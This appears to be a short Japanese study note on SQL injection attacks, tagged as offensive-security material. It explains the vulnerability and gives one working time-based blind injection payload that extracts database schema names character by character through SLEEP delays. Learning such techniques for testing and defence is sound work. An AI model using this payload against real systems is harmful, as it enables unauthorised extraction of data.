---
tags:
  - Offensive
---
# SQLインジェクション

ユーザーが入力できる場所（フォーム、GETリクエストの引数、etc...）からの入力をサニタイジングせずにSQLクエリを実行してしまう脆弱性を悪用した攻撃。

実行した結果のデータがWebサイトに表示されてしまう。表示の仕方によっては、データの漏洩はあまり起こらない場合もある。

ブラインドインジェクションでは、サーバーがアクセスできるすべてのデータが漏洩する可能性がある。

## SQLインジェクションの種類

1. ### Time-Based Blind SQL Injection
	```sql
	SELECT * FROM something 
	WHERE id = 'a' 
	-- ここから追加される
	AND (SELECT 5453 
	     FROM (SELECT(SLEEP(10-(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) 
	                               FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),12,1))>104,0,10)))))batJ) 
	AND 'iotZ'='iotZ'
	
	```
	本来のクエリに続けて、*INFORMATION_SCHEMA*等から取得したデータベース情報のn文字目が、ASCIIコードより大きければx秒スリープし、レスポンスを遅らせることで、二分探索をしながら一文字ずつ絞っていく。